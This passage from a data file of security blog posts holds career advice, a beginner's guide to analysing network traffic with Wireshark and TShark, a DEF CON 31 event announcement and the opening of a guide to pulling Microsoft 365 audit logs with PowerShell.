virtually for free. \n\nJoin a Discord Group! Discord groups like the BHIS one is a great place to connect with people who have the same interest and offer a friendly space where you can ask questions and get advice. This is the best way to get your questions answered quicky. \n\nDo outside your home: \n\nAttending in-person conferences.  \n\nParticipate in local meetup groups. Meetup.com is a great place to look for local events. In the Dallas area, our local DEF CON group and Dallas Hackers Association meet up every month. These groups are a great place to learn and meet local professionals. You can get some job leads and make friends. \n\nFind Mentorship: \n\nIf you\u2019re participating in Discord groups and local meetup groups, then you will eventually find someone who you could call a mentor. Mentorship does not need to be a formal arrangement and comes in many forms. Look for mentorship from people you already have a friendly relationship with. These are people who have extra time to answer your questions or provide you with feedback. \n\nFinally, Be Consistent.  \n\nAll these steps will take time and consistency. Don\u2019t give up after a month of no results. If you notice you aren\u2019t getting any results after 6 months, ask a mentor if they would be willing to look at your resume or give you some feedback. Talk with them about the jobs you\u2019re applying for and what you\u2019re doing to improve any knowledge gaps on your resume. I got my first technical job in 2012 selling computers, then my first full-time networking position in 2018, and my first pentesting position in 2022, 10 years after I started working with computers. Consistency and time for the win. \n\nGood luck! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Welcome to Shark Week: A Guide for Getting Started with Wireshark and TShark\"\nTaxonomies: \"Blue Team, Blue Team Tools, General InfoSec Tips & Tricks, How-To, Incident Response, Informational, InfoSec 101, InfoSec 201, Troy Wojewoda, DFIR\"\nCreation Date: \"Thu, 27 Jul 2023 15:27:15 +0000\"\nTroy Wojewoda //\n\nIn honor of Shark Week1, I decided to write this blog to demonstrate various techniques I\u2019ve found useful when analyzing network traffic with Wireshark, as well as its command-line utility, TShark. For years, Wireshark has been the de facto tool for analyzing captured network traffic. It has extensive capabilities to decapsulate (break apart) the various layers of network traffic, enabling analysis of network communication between two hosts. Use cases range from troubleshooting network connections to unraveling malicious threats within an environment, not to mention countless others in between.\n\nRemembering back to the first time I ever opened a packet capture for analysis\u2026 I felt a bit like Marty McFly in Back to the Future II when he encountered the gigantic Jaws hologram.   \n\nOkay, maybe not that dramatic, but it was intimidating to say the least. I do remember staring at the screen thinking, \u201cI have no idea what I\u2019m even looking at\u2026 Where do I start? Where\u2019s the evil? What does it all mean!?\" If you are brand new to Wireshark, this blog won\u2019t alleviate all encountered difficulties \u2013 like a recipe for mastering anything new, it takes a lot of time, patience, practice, and more practice. Akin to whenever someone asks me, \u201cHow do I get started in incident response?\u201d; My reply, \u201cStart doing incident response.\u201d\n\nHowever, before we jump into analyzing packets, there are a few housekeeping items that are worth mentioning.\n\nFirst and foremost, make sure you\u2019re using the latest version of Wireshark. Especially if you\u2019re analyzing network traffic from untrusted sources and/or points-of-presence (i.e., raw internet traffic). The last thing you need during an incident response investigation is for your analysis machine to become an additional victim.\n\nAlthough it\u2019s true that Wireshark routinely experiences bugs and vulnerabilities, it is still one of the most popularly used network protocol analyzers in the field, and although these issues surface from time to time, the community that supports this tool addresses them quickly. The following wiki article provides more details on this topic: https://wiki.wireshark.org/Security\n\nIn short, keep your tools up to date and consider utilizing Wireshark from within a virtual environment, particularly when performing packet analysis on network traffic captured from untrusted zones.\n\nNote: The current version of Wireshark was 4.0.7 when this article was published.\n\nDisplay Formats and Settings\n\nIn this section, I\u2019ll cover some of the common display formats and settings encountered with Wireshark.\n\nTime Display Format\n\nTime is one of the most critical components of any investigation, so it only makes sense that we start there. Wireshark supports several options for displaying the timestamp of a given packet. To view or change the Time Display Format, navigate from the main toolbar to: View -> Time Display Format.\n\nWireshark \u2013 Time Display Format\n\nMy preference is the UTC Date and Time of Day (1970-01-01 01:02:03.123456) option. One important note to mention about timestamps in packet captures \u2013 the timestamp is recorded at time of capture by the utility (and most likely the system time) from which the capture was taken. This may be a separate system from your analysis machine altogether, so ensure proper time synchronization is in place and routinely audited throughout your environment. A good resource on this subject is CISA\u2019s guidance2 for managing time settings in an environment. Also, NIST maintains a list of Internet Time Servers3 that can be used to synchronize time over NTP (Network Time Protocol).\n\nName Resolutions\n\nThere are three areas where automatic name resolutions can be performed by Wireshark. These settings are accessed from the main toolbar: View -> Name Resolution. In the most recent install (version 4.0.7), the only setting enabled by default was Resolve Physical Addresses.\n\nWireshark \u2013 Name Resolution\n\nDepending on the scenario, these automatic resolutions may be helpful to an analyst; however, they do have the potential to thwart analysis or even lead to OPSEC failures\u2026 let me explain a little more of what these settings do.\n\nResolve Physical Addresses (MAC OUI Resolution) \u2013 Wireshark translates the first three octets of a MAC address (also known as OUI or Organizationally Unique Identifier) to the assigned vendor name.\n\nResolve Network Addresses (Reverse DNS Resolution) \u2013 Wireshark performs reverse DNS lookups on source/destination IP addresses.\n\nResolve Transport Addresses (TCP/UDP Port Association) \u2013 Wireshark associates TCP/UDP ports to their assigned application protocols (i.e., TCP/80 \u2013 HTTP, UDP/53 \u2013 DNS).\n\nResolve Physical Addresses\n\nWith Resolve Physical Addresses selected, Wireshark will translate the OUI (first three octets in the MAC address) to its assigned vendor. As shown in the Packet Details section of a packet below, the octets 00:50:56 and 00:0c:29 were both attributed to VMware. This aligns with the fact that I used a virtual host to generate packets for testing and performed the capture from a virtual network adapter.\n\nWireshark Packet Details \u2013 Resolved Physical Addresses\n\nResolve Network Addresses\n\nWith Resolve Network Addresses selected, Wireshark will perform reverse DNS lookups on all Source and Destination IP addresses within the capture. Although this setting may seem convenient, it has the potential to \u201ctip-your-hand\u201d from an OPSEC perspective, especially if you\u2019re performing packet capture analysis containing publicly routable IP addresses.\n\nFor demonstration purposes, I enabled this setting in Wireshark from within a virtual machine where the guest system was configured in NAT mode. I then captured traffic in/out of the guest OS while opening a packet capture file \u2013 the result: reverse DNS lookups were observed leaving the guest system. The below screen capture shows that Wireshark (from within the guest OS) was initiating reverse DNS queries for the IP 137.184.39.243, out to a public DNS resolver (not shown in the capture).\n\nWireshark Packet List \u2013 Resolved Network Addresses\n\nResolve Transport Addresses\n\nWith Resolve Transport Addresses selected, Wireshark will tag each TCP and UDP port respectively with their commonly associated network protocol. For example, NTP (or Network Time Protocol) is commonly associated with both TCP/123 and UDP/123.\n\nWireshark Packet Details \u2013 Resolved Transport Addresses\n\nIn the screen capture above, we can see in the packet details section where Wireshark tagged the Destination Port as \u201cntp\u201d; however, if we peer into this conversation using the Follow TCP Stream feature, we can see that this is not NTP traffic, but rather HTTP.\n\nWireshark \u2013 Follow TCP Streams\n\nIn my opinion, the Resolve Physical Addresses this is the least [potentially] detrimental setting for analysis. There are cases where MAC address analysis is part of an investigation and a vendor lookup is helpful. The Wireshark community also maintains a website4 to perform bulk OUI lookups, which I\u2019ve found to be very useful from time to time.\n\nResolving transport addresses can be misleading, especially if you are new to network analysis\u2026 my advice to anyone considering this feature is to treat it as informational and just be cognizant that anyone with full control of a system can utilize whatever TCP/UDP port they please. I do this all the time when testing egress controls for clients and it never ceases to amaze me the number of organizations that allow outbound traffic solely on the basis of the TCP/UDP port number.\n\nAnalysts should proceed with caution when it comes to the Resolve Network Addresses option. Perhaps there are use cases where this feature is value-add; however, I don\u2019t believe the risk is worth the reward, and therefore I do not recommend it.\n\nDisplay Windows\n\nWireshark uses three windows to display packet information \u2013 these windows are:\n\nPacket List \u2013 The topmost display pane where a high-level summary of each packet is displayed. By default, Wireshark displays: the packet number, packet timestamp, source/destination addresses, protocol, and description for each packet. The column headers can be reordered (right or left) and/or clicked on to sort (ascending/descending).\n\nPacket Details \u2013 The bottom-left pane (in older versions the middle pane) shows the details of the packet selected. Wireshark displays various fields in a hierarchical structure based on the selected packet\u2019s TCP/IP layers.\n\nPacket Bytes \u2013 The bottom-right pane (in older versions the lowest pane) displays the selected packet\u2019s bytes, represented in a hex dump with ASCII characters and an offset column, also represented in hex.    \n\nThe screen capture below shows an example of each display with a packet capture file opened.\n\nWireshark \u2013 Display Windows\n\nNote: In the screen capture above, the display filter toolbar has the \u2018http\u2019 filter applied. I\u2019ll discuss more about display filters in a bit.   \n\nCapture Options\n\nIf you\u2019ve been fortunate enough to never experience processing a huge PCAP file with Wireshark, consider yourself lucky\u2026 and when I say huge, I\u2019m only talking 500MB+. Wireshark is an extremely powerful network protocol analyzer, but it is often painful to use against large packet captures. This next section will cover some techniques to help alleviate these pain points.   \n\nWhen utilizing Wireshark to capture network traffic, we can apply various capture options from both an input and output perspective. This helps limit the size of acquired data, which in turn aids our ability to analyze the traffic more swiftly. To access capture options, navigate to Capture -> Options\u2026 from the main toolbar.\n\nInput: Limiting the Capture to a Target Host\n\nTo limit the capture to a target host, we can use the following filter syntax:\n\nhost \n\nIn the example below, I\u2019m filtering on the IP address 192.168.232.130. This tells Wireshark to capture traffic where this IP is either the Source or Destination address.\n\nWireshark Capture Options \u2013 Capture Filter\n\nYou can also view some prebuilt capture filters by selecting Capture -> Capture Filters\u2026 from the main toolbar. The Filter Expression column contains example syntax for applying each respective filter.\n\nWireshark Capture Options \u2013 Saved Capture Filters\n\nOutput: Limiting the Capture Output\n\nIf the capture process is going to run for a long or indefinite period, it may be best to have Wireshark \u201croll\u201d the output to a new file based on some provided criteria. The Output section/tab provides us with a few options here. We can tell Wireshark to save a new file after x-number of packets or bytes have been collected or some defined time derivative. Below shows an example where Wireshark is configured to write a new PCAP file each time the captured data hits 100MBs.\n\nWireshark Capture Options \u2013 Output Multiple Files\n\nDisplay Filters != Capture Filters\n\nOnce a packet capture file is opened or otherwise generated with Wireshark, display filters can be applied to aid analysis.\n\nDisplay filters are different than capture filters in that:\n\nCapture filters are only applied when capturing live network traffic.\n\nDisplay filters can be used during the capture process or when analyzing a saved PCAP file.\n\nDuring a live capture, Wireshark will continue to capture traffic regardless of any display filter applied \u2013 a display filter will limit the packets being viewed, but Wireshark will continue capturing traffic in the background, as defined in the Capture Options \u2013 Input tab.   \n\nThe Display Filter Toolbar is located just above the Packet List window. Conveniently, Wireshark will populate a dropdown of display filter selections as you type in this field. This makes it less likely that an improperly formatted filter gets applied. Note: Wireshark will highlight the filter toolbar in red if the filter syntax is incomplete/invalid.\n\nMany of the supported Wireshark display filters use a hierarchical syntax represented in dot-notation. For example, if we want to apply an HTTP-based display filter, but wish to be more granular in our selection, we can type: \u201chttp\u201d directly followed by \u201c.\u201d Wireshark will then list all supported HTTP display filters.\n\nWireshark \u2013 HTTP Filter Options\n\nIf you\u2019re curious to know all built-in supported display filters, simply navigate to: View -> Internals -> Supported Protocols and view the filter column for the desired filter syntax. Shown below is just a portion of supported HTTP display filters.\n\nWireshark \u2013 Supported Protocols [partial HTTP Listing]\n\nWireshark currently supports over 218k display filters from nearly 3k protocols!\n\nFollow the Streams\n\nViewing packet contents is one of the most powerful capabilities when it comes to network traffic analysis. The more context we have, the better informed we are during analysis. But that may be easier said than done when viewing captured network traffic at a per-packet level. Sure, we can select each packet and view the packet details and packet bytes sections within Wireshark, but that approach doesn\u2019t scale well.\n\nFortunately, Wireshark provides us with the capability to view a given \u201cStream\u201d of network traffic. Wireshark supports stream analysis over several different protocols \u2013 for this topic, we\u2019ll be looking at TCP streams. To view a given TCP stream, right-click on a TCP packet in the Packet List display and select Follow -> TCP Stream.\n\nWireshark \u2013 Follow TCP Streams\n\nUpon making this selection, Wireshark does two things:\n\nDisplays the TCP stream in a new window.\n\nClient data (host that initiated the connection) is color-coded in red.\n\nServer data (host that responded to the client request) is color-coded in blue.\n\nAutomatically applies a tcp.stream display filter accordingly.\n\nWireshark catalogs all streams on initial processing, with the first stream identified as Stream 0. As shown in the below screenshot, the display filter was tcp.stream eq 3 or in other words the 4th TCP stream in the capture file.\n\nWireshark \u2013 Follow TCP Streams with Auto-Applied Display Filter\n\nExtracting Objects\n\nThere\u2019s nothing more satisfying to an incident responder than being able to extract attacker artifacts from network traffic. The specific email used as a phish \u2013 containing URLs and/or attachments, malicious file downloads, exfiltrated data, etc., etc.\n\nFortunately, Wireshark has a built-in capability that allows us to extract objects from network traffic.  Unfortunately, Wireshark limits this capability to only a handful of protocols. We can see the supported protocols by navigating to File -> Export Objects.\n\nWireshark Supported Protocols for Exporting Objects\n\nIf you\u2019re in a scenario where you have captured traffic containing threat activity, there\u2019s an opportunity to extract file artifacts for a deeper dive into the content that was transferred over the network. To demonstrate, I opened a test PCAP file and navigated to File -> Export Objects -> HTTP\u2026  \n\nWe can see below where several \u201cobjects\u201d have been identified by Wireshark \u2013 each one of them can now be extracted (saved to disk) for additional analysis.\n\nWireshark \u2013 Exporting HTTP Objects\n\nOperationalizing from the Command Line\n\nNow that I\u2019ve covered some of the basic settings and features of Wireshark, I\u2019ll show some practical use cases for operationalizing your analysis\u2026 yes, we are going to pivot to the command line using TShark, where we can do something useful rather than just staring into a GUI-abyss of packets!\n\nIn all seriousness, there is nothing wrong with doing your analysis from within Wireshark. In fact, I find it extremely useful to have an instance of Wireshark running while utilizing TShark. The difficult part with Wireshark is when we need to extract network data in bulk for things like data-stacking, generating network telemetry that can be fed into a SIEM, or any other analysis machine/process.\n\nWith TShark, we can harness the power of the command line while retaining the extensive protocol analyzers that come with Wireshark.\n\nFor starters, TShark needs some command line options. We\u2019ll look at several useful ones here and I encourage you to read the man page5 and explore additional options as you get more comfortable.\n\nTo read in a PCAP file, we use the \u2018-r\u2019 option; I always couple this with \u2018-n\u2019 which tells TShark NOT to perform any name resolution shenanigans.\n\ntshark -nr infile.pcap \n\nTo apply a display filter, we use the \u2018-Y\u2019 option followed by the display filter.\n\ntshark -nr infile.pcap -Y \u2018dns\u2019\n\nTo write out a PCAP file, we use the \u2018-w\u2019 option. If we have a display filter applied, this will instruct TShark to save a new PCAP file with only the packets matching the display filter.\n\ntshark -nr infile.pcap -Y \u2018dns\u2019 -w newfile.pcap\n\nAnd finally, to capture traffic with TShark, we use the \u2018-i\u2019 option to specify the interface to capture from.\n\ntshark -ni eth0\n\nWithout specifying any additional parameters, TShark will just print to stdout (standard output); therefore, we specify the \u2018-w\u2019 to instruct TShark to write a PCAP file. Additionally, if we want to apply a capture filter, the \u2018-f\u2019 option is used.\n\ntshark -ni eth0 -f \"host 192.168.20.10\" -w test.pcap\n\nNow let\u2019s see what this looks like in real life\u2026\n\nApplying the \u2018http\u2019 display filter to a pcap file, we get the following output.\n\nTShark \u2013 Default Timestamp\n\nNote the timestamps are in relative seconds from the first observed packet.\n\nWe can fix this with the \u2018-t\u2019 option and \u2018ud\u2019 parameter which tells TShark to output the timestamp in UTC absolute time, in the format: YYYY-MM-DD hh:mm:ss.SSS\n\nTShark \u2013 UTC Absolute Timestamp\n\nMuch better!\n\nNow let\u2019s get dangerous and extract data fields from a PCAP file. TShark supports field extractions using the \u2018-T fields\u2019 option along with the \u2018-e\u2019 option to specify which fields are to be extracted.\n\nHere\u2019s an example command that targets HTTP packets and prints out the timestamp (in epoch time), source IP address, and destination IP address.\n\ntshark -nr infile.pcap -Y 'http' -T fields -e frame.time_epoch -e ip.src -e ip.dst \n\nBy default, TShark will print to stdout with extracted field values as tab delimited. \n\nTShark \u2013 HTTP Filter\n\nWe can customize the output a bit more by adding the \u2018-E header\u2019 and \u2018-E separator\u2019 options as shown in the following command.\n\ntshark -nr infile.pcap -Y 'http' -T fields -E header=y -E separator='|' -e frame.time_epoch -e ip.src -e ip.dst\n\n\u2018-E header=y\u2019 instructs TShark to print the field name on the first line of output.\n\n\u2018-E separator=\u2019|\u2019 instructs TShark to use a custom separator value, in this case the pipe character (|).\n\nTShark \u2013 HTTP Filter with Header and Custom Separator\n\nThis is great, but you may be asking yourself, \u201chow do I know the specific field name to target for extraction?\u201d Well, this is where having a running instance of Wireshark comes in extremely handy!\n\nWe can utilize the display filter trick in Wireshark and find the specific field(s) we\u2019re after. For example, if we want to extract all HTTP User-Agent values with TShark, open Wireshark and go to the Display Filter Toolbar and start typing \u201chttp.\u201d (don\u2019t forget the \u2018.\u2019) \u2013 then scroll down until you find the User-Agent field name, http.user_agent.\n\nWireshark \u2013 http.user_agent Filter\n\nI find it even more convenient to extract field names in the Packet Details section, then have Wireshark just tell me the specific filter syntax. This can be achieved by right-clicking on a field of interest and selecting Apply as Filter -> Selected.\n\nWireshark \u2013 Apply as Filter\n\nViola\u2026 Wireshark will apply the filter in the Display Filter Toolbar for you!\n\nWireshark \u2013 http.user_agent Filter\n\nAlthough the specific value is also applied to the filter in Wireshark, we can ignore that as we are only interested in the field name, http.user_agent. Now, we can take that to TShark and extract all unique User-Agent strings observed over HTTP.\n\ntshark -nr infile.pcap -Y 'http' -T fields -E header=y -E separator='|' -e ip.src -e http.user_agent\n\nThere is, however, a slight \u201cgotcha\u201d in the above command. As shown in the output below, each instance where the Source IP is 137.184.39.243, the User-Agent field is empty.\n\nTShark \u2013 HTTP Filter with User-Agent Values Extracted\n\nThis is because we instructed TShark to extract fields based on the -Y \u2018http\u2019 filter, which returns all HTTP traffic \u2013 both client requests and server responses. In the HTTP protocol, User-Agent strings are sent by the client to the server, and since TShark applies filters on a per-packet basis, packets associated with server responses will not contain User-Agent values.\n\nTo avoid this, we need to be a bit more tactical with our filter and use http.request rather than just http.\n\ntshark -nr infile.pcap -Y 'http.request' -T fields -E header=y -E separator='|' -e ip.src -e http.user_agent\n\nWith the above command applied, we now see that the only Source IP associated with User-Agent values is 192.168.88.55.\n\nTShark \u2013 http.request Filter with User-Agent Values Extracted\n\nBecause we are on the command line, we can redirect the output to perform additional actions on the extracted data. For these examples I\u2019m using TShark on an Ubuntu system, therefore I can utilize additional utilities from there.\n\nSuppose we wanted to extract all unique combinations of Source IP addresses and User-Agent values and determine their frequency of occurrence within a packet capture. We can modify the previous command slightly by redirecting the TShark output to the sort and uniq utilities, which are pre-installed on Ubuntu.\n\ntshark -nr infile.pcap -Y 'http.request' -T fields -E separator='|' -e ip.src -e http.user_agent | sort | uniq -c | sort -nr\n\nThe above command results in the following output.\n\nUnique Source IP and User-Agent Values with Count of Occurrences\n\nThe results show that we have two unique User-Agent values in this packet capture file, and both are attributed to the host 192.168.88.55. The User-Agent string listed first was observed 4 times in the capture, while the second User-Agent value was seen once.\n\nWhat does sort | uniq -c | sort -nr do, you might ask\u2026 well, the first sort command sorts each line prior to sending to uniq. This is needed because the uniq command only matches on adjacent lines. Then the uniq -c command counts each unique line value (this is where we get the counts 4 and 1). Finally, the last command, sort -nr, sorts the output by numeric value (-n) and in \u201creverse\u201d order (-r), which essentially means descending as opposed to the default ascending order.\n\nClosing Remarks\n\nI hope that this guide provided some helpful tips and tricks for those getting started with Wireshark and/or TShark, and equally important, sparked ideas to take your network-analysis-fu to the next level. If you find yourself overwhelmed while analyzing network traffic, it\u2019s okay, this is normal. Keep in mind that tools aid our analysis, but they are not perfect, no tool is.\n\nWe also need to have a sound understanding of what we are analyzing. So, start with a common network protocol, such as DNS or HTTP, and learn as much as possible \u2013 this will enhance your ability to distinguish between benign and malicious traffic in your environment.\n\nReferences\n\n[1] https://www.discovery.com/shark-week\n\n[2] https://www.cisa.gov/sites/default/files/202302/time_guidance_network_operators_cios_cisos_508.pdf\n\n[3] https://tf.nist.gov/tf-cgi/servers.cgi \n\n[4] https://www.wireshark.org/tools/oui-lookup\n\n[5] https://www.wireshark.org/docs/man-pages/tshark.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Join Us for Camp BHIS @ DEF CON 31\"\nTaxonomies: \"Backdoors & Breaches, Fun & Games, Informational, News, Def Con\"\nCreation Date: \"Fri, 04 Aug 2023 00:37:10 +0000\"\nHey, Campers! \n\nIt\u2019s that time of year again. The smell of 0-day in the air. Charlatans roasting by the pyre. Old friends and new gather in one of the worst places in the world for those that have more hoodies than days to wear them... LAS VEGAS!  This year, Black Hills Information Security (BHIS) will be at the brand-new DEF CON Exhibitors Hall! Does that sound too business-y for you? Us too, so we\u2019re doing it in the most BHIS way possible. We\u2019re going shopping on-site at DEF CON and building our booth while there. No slick booth wizardry, just some camp chairs, friends, and conversations promoting the projects of folks in the community we love. Oh, and you can learn more about us too (if you\u2019re into that sort of thing).  \n\nAt the end, we\u2019re donating everything in the booth to a local charity that supports helping the homeless in Las Vegas. Join us in our Exhibitors Hall booth at Caesars Forum on August 11th, 12th, and 13th for some of the amazing camp activities below. You can also find us around DEF CON at various events. Check out the info below and come say hi!  \n\nDon\u2019t worry if you\u2019re not at Summer Camp this year, we will be running live streams from our booth to bring a little bit of Hacker Summer Camp to you, wherever you are. Watch our YouTube channel for event times and links! \n\nLINECON \u2013 Backdoors & Breaches Demos \n\nWeds \u2013 8/9/23 - 9:30pm \u2013 11:30pm PT \u2013 Linecon - Caesars Forum \n\nWaiting in line to get your DEF CON badge? Want to learn how to play Backdoors & Breaches, get a free deck, and meet folks from BHIS? We thought future-you would say that! We will be wandering Linecon teaching people how to play and handing out free decks. Look for the folks with the carts and the bullhorn. (You know, honestly, at DEF CON, that may describe lots of folks.) Either way, we will be there teaching y'all how to play. We\u2019re looking forward to making tons of new friends. Learn more about Backdoors & Breaches at www.backdoorsandbreaches.com\n\nHot Red Team Tips \u2013 Ralph May and Steve Borosh \n\nFri \u2013 8/11/23 - Noon \u2013 1pm PT \u2013 Red Team Village  Fri \u2013 8/11/23 \u2013 3pm \u2013 4pm PT \u2013 Red Team Village  Sat \u2013 8/12/23 - 10:00am \u2013 11:00am PT \u2013 Red Team Village Sat - 8/12/23 - Noon \u2013 1pm PT \u2013 Red Team Village \n\nJoin BHIS testers Ralph May and Steve Borosh in the Red Team Village as they discuss some of their best tips for red teamers. These tips come from their extensive work in the field on actual red team engagements. If red teaming is your thing, you won\u2019t want to miss this! Find out more at: https://redteamvillage.io/redhot.html  \n\nSocial Engineering Community Vishing Competition \u2013 Ean Meyer \n\nFri - 8/11/23 - 12:30pm to 1:30pm \u2013 Social Engineering Community Village \n\nCome watch as BHIS Content & Community Co-Creator, Ean Meyer, gets in the booth and makes cold calls to his target. Win or lose, we promise you will be entertained. Bason Jlanchard may even make an appearance at the booth. Ean will also have some top-secret custom stickers to hand out during his call. Learn more at: https://www.se.community/  \n\nDarknet Diaries x PROMPT# - Jeremy from Marketing Graphic Novel signing with Jack Rhysider \n\nFri \u2013 8/11/23 - 3pm \u2013 4pm PT \u2013 Caesars Forum - Exhibitors Hall \u2013 BHIS Booth \n\nYou heard that right. BHIS, PROMPT# (our infosec zine), and Darknet Diaries have teamed up to bring \u201cEpisode 36: Jeremy from Marketing\u201d to a graphic novel! We will have 1,000 copies at our booth to give away FOR FREE! If that isn\u2019t good enough, Jack Rhysider, host and creator of Darknet Diaries, will be signing copies. Darknet Diaries is the wildly popular podcast about \u201cthe dark side of the Internet.\u201d Come early, as we're betting they run out fast. Find out more about Darknet Diaries and the episode the comic is based off here: https://darknetdiaries.com/episode/36/. You can also sign up to receive PROMPT# zine shipped to your door for free here: https://www.blackhillsinfosec.com/prompt-zine/ \n\nRed Team Alliance Training Facility with Deviant Ollam \n\nFri \u2013 5pm \u2013 5:30pm PT \u2013 Caesars Forum - Exhibitors Hall \u2013 BHIS Booth \n\nPhysical Entry Specialist, connosseur of many things, and all-around wonderful person, Deviant Ollam, will be stopping by to talk about the opening of the Red Team Alliance\u2019s brand-new state-of-the-art physical security training center in Las Vegas. Stop by to learn more about it and meet the fantastic human behind the internet legends. Learn more about the Red Team Alliance at: https://www.redteamalliance.com/  \n\nBadge Live Stream with Ironwood Cyber \n\nSat \u2013 10am \u2013 11am PT \u2013 Caesars Forum - Exhibitors Hall \u2013 BHIS Booth \n\nLast year, Ironwood Cyber had the most sought-after badge of DEF CON 30: the Tron Identity Disk. Full of features, hacking challenges, and an amazing design, their badge this year is one of the most anticipated badges at DEF CON 31. And it can\u2019t be bought. You can only get it from them at their surprise drop points. Follow the Ironwood Cyber Twitter account to find out where they will be dropping the new Arc Reactor badge: https://twitter.com/IronwoodCyber. Want to find out how it was built? Join us at the booth or watch on the live stream! We will be talking with Jose Rodriguez of Ironwood Cyber about the build, challenges, and everything it took to make the new badge a reality. You can see a preview of this incredible badge, and just a few of the things it\u2019s packed with, here: https://twitter.com/IronwoodCyber/status/1683891870705778694\n\nLive Stream and Book Signing \u2013 Joe Gray (C3PJoe) - OSINT\n\nSat \u2013 11am \u2013 12:30pm PT \u2013 Caesars Forum - Exhibitors Hall \u2013 BHIS Booth \n\nOpen-source intelligence expert, regular judge for the TraceLabs CTF, and founder of The OSINTion OSINT training, Joe Gray, will stop by to talk about his book, Practical Social Engineering, from No Starch Press. We will talk about his OSINTion training, his Antisyphon course, and how he went about writing his book. We will have 40 copies for sale that you can get autographed, so stop by, meet Joe, and pick up a copy before they are all gone. Check out his book and the OSINTion at the links below: https://www.theosintion.com/  \n\nLive Stream and Book Signing \u2013 The Active Defender \u2013 Dr. Cathy Ullman\n\nSat \u2013 8/12/23 - 3:00pm \u2013 4:30pm PT \u2013 Caesars Forum - Exhibitors Hall \u2013 BHIS Booth \n\nFriend of the show and huge supporter of the infosec community, Dr. Cathy Ullman, who you may know as Investigatorchic, has a new book out called \u201cThe Active Defender: Immersion in the Offensive Security Mindset.\u201d Hot off the presses on July 26th and published by Wiley, it covers how to think like an offensive security pro when you\u2019re a defender. Lots of tools, tips, and methods to help the blue team fight like the red team. Come by our booth where we will be doing a live stream talking about the book followed by a book signing. We will have 40 copies in stock that you can purchase at list price and get signed by the author! Learn more about the book here: https://www.wiley.com/en-us/The+Active+Defender%3A+Immersion+in+the+Offensive+Security+Mindset-p-9781119895213  \n\nFloridaman Party \n\nFri. 9:00pm \u2013 11:00pm PT \u2013 Margaritaville  \n\nFor Florida men, women, non-binary, alligators, and zombies recovering from bath salts, the Floridaman Party has been a DEF CON favorite for years. This is a community-run party is funded through badge sales. You don\u2019t need to be from Florida to show up and experience the chaos of Florida. Ean Meyer, from Black Hills Information Security, will be running an auction at 9:50pm PT at the party to benefit BSides Orlando. Bring your cash to help support this community conference and make new friends. Other BHIS testers will also be around, so keep an eye out. You can still purchase badges for pickup at https://floridaman.party/  \n\nHacker Jeopardy \n\nSat. 10:00pm \u2013 11:00pm PT \u2013 Caesars Forum  \n\nIf you haven\u2019t experienced Hacker Jeopardy, it\u2019s a DEF CON must. Hosted by the amazing Lintile, hackers like you compete in a Jeopardy-style game show that starts off the rails and never really makes it back on track. Watch as hackers, cyber security experts, and anyone brave enough to play, fails (in front of a massive audience) to answer what runs on port 23. Black Hills Information Security will be giving the winners Antisyphon Training vouchers AND $250 in Caesar Chips to turn in for cash or make even more bad decisions at the tables. Just remember, DFIU. Learn more at: https://forum.defcon.org/node/245322  \n\nWhose Slide Is It Anyway?\n\nSat. 11:00pm \u2013 11:59am PT \u2013 Caesars Forum \n\nDoes the idea of presenting a slide deck you\u2019ve never seen sound terrifying? What if it was created by an AI whose only data model was a middle school Roblox Discord server and SEC 10k filings? What if you had to do this in front of 1000 strangers? Guess what, you\u2019re right. It\u2019s a horrifying and magical train wreck that you won\u2019t want to look away from. The fabulous Rand0h will host along with many judges, including Ean Meyer and Deb Wigley from Black Hills Information Security. BHIS will be giving the winner $250 in Caesars Chips to turn in for cash or double down in the casinos. (Whatever they want, we aren\u2019t their mom. If we were their mom, we would be extremely ashamed of them for ruining the family name by winning at Whose Slide.) Find out more here: https://forum.defcon.org/node/245436  \n\nThat's a whole lot of Black Hills in a whole lot of DEF CON!\n\nCheck back here for other updates, changes, and general chaos. We hope you come to Camp BHIS at DEF CON. Say hi. Oh, and remember... drink lots of water. You're in a desert with a giant glowing orb in it. Water is always a good option. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wrangling the M365 UAL with PowerShell and SOF-ELK (Part 1 of 3)\"\nTaxonomies: \"How-To, Incident Response, InfoSec 201, Patterson Cake, Phishing, BEC, Business Email Compromise, Exchange Online Management, M365, Microsoft 365, PowerShell EXO, SOF-ELK, UAL, Unified Audit Log\"\nCreation Date: \"Thu, 10 Aug 2023 16:08:48 +0000\"\nPatterson Cake //\n\nWhen it comes to M365 audit and investigation, the \u201cUnified Audit Log\u201d (UAL) is your friend. It can be surly, obstinate, and wholly inadequate, but your friend nonetheless. Sadly, depending upon licensing and retention, it is sometimes your only friend. Regardless of the type of audit or investigation you need to conduct, your UAL challenges are three-fold: acquiring the data, parsing the output, and querying the data to answer your audit and investigative questions. In this post, we\u2019ll step through one approach to overcoming all three challenges with the Exchange Online Management PowerShell module and \u201cSecurity Operations and Forensics Elasticsearch, Logstash, Kibana\u201d (SOF-ELK).\n\nBefore wrangling, it\u2019s worth asking, \u201cDoes the UAL contain the data you\u2019re looking for?\u201d Since the UAL combines data from multiple M365 services, aka \u201cworkloads,\u201d it may be more efficient to directly access service logging and, in some cases, the details you require may not actually populate the UAL. You can review the properties captured by the UAL per service here: Detailed properties in the audit log - Microsoft Purview (compliance) | Microsoft Learn\n\nIt is also worth noting that the M365 ecosystem is ever-changing and licensing can be convoluted, confusing, and directly impacts UAL retention and properties. That is a \u201cwrangling\u201d conversation all on its own but, tactically speaking, armed with a basic understanding of what can and should be included in the UAL, I\u2019ll often sample the data for a tenant to see what I can see and to ascertain retention, as opposed to laboring over E3 vs E5 and Azure P1 vs Entra Identity P2, etc. Retrospectively, it may be worthwhile to return to the questions of licensing levels, property availability, and retention as a \u201clessons learned\u201d opportunity, especially if you were unable to answer your audit/investigative questions based on the current M365 tenant configuration.\n\nOnce we\u2019ve decided that in our audit/investigative scenario the UAL is indeed our friend, it\u2019s time to roll up our sleeves, don boots and the obligatory hat, and get to wrangling! First things first, we need to acquire the UAL data. There are a few different ways to approach this, namely the \u201cCompliance Portal\u201d (aka Purview), the Office 365 API, and the Exchange Online PowerShell module (EXO). I prefer the latter because of inline filtering capabilities, some workarounds for max-returned records limitations, and for the flexible output formats, particularly as we look toward the next steps of parsing and querying via SOF-ELK.\n\nAt the time of this writing, the current version of EXO is 3.2.0 and requires PowerShell 7. You can choose your own poison in terms of where and how to install these, but I\u2019m starting with a fresh Windows 2022 Server Base AWS EC2 instance (t2.medium), downloading 